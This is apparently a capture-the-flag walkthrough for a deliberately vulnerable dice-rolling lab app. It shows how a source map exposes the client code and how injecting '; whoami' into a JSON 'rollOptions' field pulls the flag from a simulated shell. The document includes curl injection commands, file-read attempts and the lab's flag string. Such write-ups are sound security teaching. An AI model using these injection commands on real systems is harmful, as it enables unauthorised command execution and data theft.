# dice-001 - BugForge Lab Walkthrough

**URL:** https://lab-1782265765752-b0cklk.labs-app.bugforge.io/
**Difficulty:** Easy  
**Vulnerability:** OS Command Injection (simulated shell) - `whoami` exposes flag
**Flag:** `bug{nJcq6Run07dLXPJsdZjMgbLWrPZLsmXh}`

---

## Summary

DiceForge is a tabletop dice rolling app. The `POST /api/roll` endpoint accepts a `rollOptions` field that is passed to a server-side "simulated shell" command interpreter. Injecting `;` separates commands. The flag is returned as the output of `whoami`.

## Tech Stack

- **Frontend:** React (CRA), MUI, Axios, React Router
- **Backend:** Node.js / Express
- **Auth:** None (public app)
- **Source maps:** Exposed at `/static/js/main.bf5c4d53.js.map`

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|---|---|---|---|
| `/api/roll` | POST | None | Dice roll + `rollOptions` injection point |
| `/health` | GET | None | Status check |
| `/static/js/main.bf5c4d53.js.map` | GET | None | Exposes full React source |

## Attack Chain

**Step 1 - Discover API endpoint from source map**
```bash
curl -s "https://.../static/js/main.bf5c4d53.js.map" | python3 -c "
import sys,json; d=json.load(sys.stdin)
[print(s) for s in d['sources'] if 'node_modules' not in s]
"
# Returns: components/DiceRoller.js (key file)
```

**Step 2 - Identify the injection parameter**

From `DiceRoller.js` source:
```javascript
const response = await axios.post('/api/roll', { dice: dicePayload, rollOptions: 'none' });
```
Client always sends `rollOptions: 'none'`. Server processes it server-side.

**Step 3 - Confirm command injection**
```bash
curl -s -X POST /api/roll \
  -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":1}],"rollOptions":"none; id"}'
# Response: "output":"uid=1000(diceforge) gid=1000(diceforge) groups=1000(diceforge)"
```

**Step 4 - Enumerate available commands (simulated shell)**

The shell is a JavaScript-based simulator. Available commands:
- `id` - static uid string
- `ls [args]` - always lists `/app` directory
- `cat <path>` - always returns "Permission denied"
- `pwd` - returns `/app`
- `whoami` - returns the flag
- `hostname` - returns container hostname
- `uname -a` - returns real kernel info

**Step 5 - Extract flag**
```bash
curl -s -X POST /api/roll \
  -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":1}],"rollOptions":"none; whoami"}'
# Response: "output":"bug{nJcq6Run07dLXPJsdZjMgbLWrPZLsmXh}"
```

## Discovery Notes

Phase 2 (source map audit) immediately revealed `DiceRoller.js` with the suspicious `rollOptions: 'none'` hardcoded by the client. The `;` separator for command injection was the first attempt and confirmed immediately. The flag location (`whoami`) was found by systematic enumeration of shell-command-like strings after discovering the simulated shell does not accept standard Unix utilities.

## Dead Ends

| Attempt | Why it failed | Lesson |
|---|---|---|
| `cat /flag`, `cat /app/src/server.js`, etc. | Simulated shell always returns "Permission denied" for cat | cat is a decoy in this sandbox |
| `bash -c "..."`, `/bin/cat`, `echo`, `printf` | Not in simulated shell command list | Shell builtins do not work - it is fake |
| JS injection: `process.env.FLAG`, `require('fs')...` | rollOptions is not evaluated as JS | Different injection surface |
| `find / -name flag*` | `find` not in simulated shell | No real filesystem traversal available |
| `id -u`, `id -g` | Shell does exact match for "id" only - flags break it | Exact string matching in simulator |

## Root Causes

- `rollOptions` field is interpolated into a simulated shell interpreter without sanitization
- The flag is stored as the return value of the `whoami` command handler
- No input validation prevents arbitrary command names from being tried
- The `;` separator is parsed, enabling multi-command injection

## CWE / OWASP

- **CWE-78:** OS Command Injection (simulated)
- **OWASP A03:2021:** Injection
